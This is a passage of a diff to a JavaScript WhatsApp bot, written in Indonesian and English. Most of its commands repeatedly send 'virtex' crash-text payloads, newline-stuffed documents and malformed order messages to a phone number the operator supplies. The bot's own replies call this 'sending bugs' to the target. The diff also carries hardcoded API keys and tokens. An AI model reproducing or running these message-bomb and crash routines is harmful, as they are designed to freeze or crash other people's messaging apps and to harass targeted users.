+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: tizi}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${rumgc} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'sendgasfull' :  case '🐵':{
- if (!isCreator) return m.reply('*Special Premium*')
+ if (!isCreator) return m.reply(`*special Premium*`)
  await loading()
 Pe = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(Pe, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${Pe} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'sendunlidelay' :  case '🐒':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
@@ -3042,11 +2668,11 @@ await sleep(2000)
 haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${Pe} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'sendunlilag' : case'🙊': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
@@ -3146,11 +2772,11 @@ await sleep(2000)
 haikal.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${Pe} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'sendunlibom' :  case '🙉':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
@@ -3250,11 +2876,11 @@ await sleep(2000)
 haikal.sendMessage(Pe, {text: weg}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${Pe} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'sendunlicuy' :  case '🙈':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
@@ -3354,11 +2980,11 @@ await sleep(2000)
 haikal.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${Pe} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
  case 'unlitet' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 haikal.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
@@ -3460,7 +3086,7 @@ await sleep(2000)
 break
 //=================================================//
 case 'unlidelay' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 haikal.sendMessage(from, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
@@ -3562,7 +3188,7 @@ await sleep(2000)
 break
 //=================================================//
 case 'unlilag' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 haikal.sendMessage(from, {text: cttl}, {quoted:kalgans})
 await sleep(2000)
@@ -3664,7 +3290,7 @@ await sleep(2000)
 break
 //=================================================//
 case 'unlibom' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 haikal.sendMessage(from, {text: weg}, {quoted:kalgans})
 await sleep(2000)
@@ -3766,7 +3392,7 @@ await sleep(2000)
 break
 //=================================================//
 case 'unlicuy' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 haikal.sendMessage(from, {text: tizi}, {quoted:kalgans})
 await sleep(2000)
@@ -3868,7 +3494,7 @@ await sleep(2000)
 break
 //=================================================//
 case 'unlidocu': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 jumlah = "15"
 for (let i = 0; i < jumlah; i++) {
@@ -3893,10 +3519,9 @@ haikal.relayMessage(from, document.message, { messageId: document.key.id })
 await sleep(2000)
 }
 break
-
 //=================================================//
 case 'unlitroli': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 jumlah = "15"
 for (let i = 0; i < jumlah; i++) {
@@ -3913,7 +3538,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "sellerJid": "2347082252014@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
-}), { userJid: from, quoted : m})
+}), { userJid: from, quoted : kalgans})
 haikal.relayMessage(from, order.message, { messageId: order.key.id })
 }
 await sleep(2000)
@@ -3921,7 +3546,7 @@ await sleep(2000)
 break
 //=================================================//
 case 'unlivirtext' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
@@ -4023,9 +3648,9 @@ await sleep(2000)
 break
 //=================================================//
 case 'sendunlidocu': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-if (args.length < 1) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
+if (args.length < 1) return m.reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 jumlah = "15"
 for (let i = 0; i < jumlah; i++) {
@@ -4047,14 +3672,14 @@ var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 }), { userJid: from, quoted:kalgans})
 haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${bnnd} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${bnnd} Please Wait 3 Minutes Yesh*`)
 }
 break
 //=================================================//
 case 'sendunlitroli': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-if (!args[0]) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
+if (!args[0]) return m.reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 jumlah = "15"
 for (let i = 0; i < jumlah; i++) {
@@ -4074,12 +3699,12 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 }), { userJid: from, quoted:m})
 haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${bnnd} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${bnnd} Please Wait 3 Minutes Yesh*`)
 }
 break
 //=================================================//
 case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
- if (!isCreator) return m.reply('*Special Premium*')
+ if (!isCreator) return m.reply(`*special Premium*`)
  await loading()
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
@@ -4147,57 +3772,30 @@ await sleep(2000)
 haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS ${Pe} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
-case '🗿': case '🥔': case '🌰': case '🎂': case '🍆': case '🥑': case '🥒': case '🥦': case '🌽': case '🍠': case '🥕': case '🌶️': case '🍅': case '🥥': case '🍇': case '🥝': case '🍐': case '🍏': case '🍈': case '🍋': case '🍌': case '🍍': case '🍊': case '🍑': case '🍉': case '🍎': case '🍒️': case '🍓': case '🍄': case '🌻': case '🏵️': case '💮': case '🌸': case '🌺': case '🥀': case '🌹': case '🤯': case '🖕': case '🤙': case '💋': case '💦': case '💩': case '👿': case '👻': case '🤡': case '🤮': case '😇': case '😠': case '😭': case '🔥': case '😎': case '😜': case '😡': case '🤫': case '❤️': case '😱': case '🤣': case '😂': case '😘': case '💔': case '👊': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!args[0]) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
-bnnd = text.split("|")[0]+'@s.whatsapp.net'
-jumlah = "15"
-for (let i = 0; i < jumlah; i++) {
-var document = generateWAMessageFromContent(from, proto.Message.fromObject({
-"documentMessage": {
-"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
-"mimetype": "",
-"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
-"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
-"pageCount": 0,
-"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
-"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
-"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
-"mediaKeyTimestamp": "1658703206",
-"caption":` ${botname} ${buttonkal}`,
-}
-
-}), { userJid: from, quoted:kalgans})
-haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
-}
-await sleep(2000)
-}
-break
 //=================================================//
 case 'dux': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 joauu = fs.readFileSync('./baseikal/video/hwmods.mp4')
-haikal.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI Special ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
+haikal.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI special ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
 }
 break
 //=================================================//
 case 'duxx': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 joauuuuu = fs.readFileSync('./baseikal/video/hwmods2.mp4')
-haikal.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI Special ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
+haikal.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI special ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
 }
 break
 //=================================================//
 case 'linkgroup': case 'linkgc': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
 await loading()
 let response = await haikal.groupInviteCode(from)
 haikal.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
@@ -4205,19 +3803,19 @@ haikal.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${g
 break
 //=================================================//
 case 'resetlinkgc':
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
 await loading()
 haikal.groupRevokeInvite(from)
 break
 //=================================================//
 case 'sendlinkgc': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
 await loading()
-if (!args[0]) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
+if (!args[0]) return m.reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 let response = await haikal.groupInviteCode(from)
 haikal.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
@@ -4226,10 +3824,10 @@ haikal.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${g
 break
 //=================================================//
 case 'kick': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.groupParticipantsUpdate(from, [users], 'remove')
@@ -4237,10 +3835,10 @@ await haikal.groupParticipantsUpdate(from, [users], 'remove')
 break
 //=================================================//
 case 'add': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.groupParticipantsUpdate(from, [users], 'add')
@@ -4248,10 +3846,10 @@ await haikal.groupParticipantsUpdate(from, [users], 'add')
 break
 //=================================================//
 case 'promote': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.groupParticipantsUpdate(from, [users], 'promote')
@@ -4259,19 +3857,19 @@ await haikal.groupParticipantsUpdate(from, [users], 'promote')
 break
 //=================================================//
 case 'demote': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await haikal.groupParticipantsUpdate(from, [botNumber], 'demote')
+await haikal.groupParticipantsUpdate(from, [users], 'demote')
 }
 break
 //=================================================//
 case 'hidetag': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
 await loading()
 haikal.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
 }
@@ -4282,18 +3880,70 @@ case 'ttp2':
 case 'ttp3':
 case 'ttp4':
 case 'attp':
-if (isBan) return m.reply('*BANNED BY OWNER*')
+if (isBan) return m.reply('*Lu Di Ban Owner*')
 await loading()
 if (args.length == 0) return reply(`Example: ${prefix + command} Znxn Xyz`)
 ini_txt = args.join(" ")
 ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
 haikal.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
 break
+//=================================================//
+case  'qc':{
+if (isBan) return m.reply('*Lu Di Ban Owner*')
+let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
+if (!teks) return m.reply(`Cara usersan ${prefix}qc teks`)
+await loading()
+const text = `${teks}`
+const username = await haikal.getName(m.quoted ? m.quoted.sender : m.sender)
+const avatar = await haikal.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)
+
+const json = {
+type: "quote",
+format: "png",
+backgroundColor: "#FFFFFF",
+width: 700,
+height: 580,
+scale: 2,
+"messages": [
+{
+"entities": [],
+"avatar": true,
+"from": {
+"id": 1,
+"name": username,
+"photo": {
+"url": avatar
+}
+},
+"text": text,
+"replyMessage": {}
+}
+ ],
+};
+axios
+.post(
+"https://bot.lyo.su/quote/generate",
+json,
+{
+headers: { "Content-Type": "application/json" },
+})
+.then(async (res) => {
+const buffer = Buffer.from(res.data.result.image, "base64");
+let encmedia = await haikal.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
+author: global.author, 
+categories: ['🤩', '🎉'],
+id: '12345',
+quality: 100,
+background: 'transparent'})
+await fs.unlinkSync(encmedia)
+})
+}
+break 
 //=================================================
 case 'editgroup': {   
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply(`*special Premium*`)
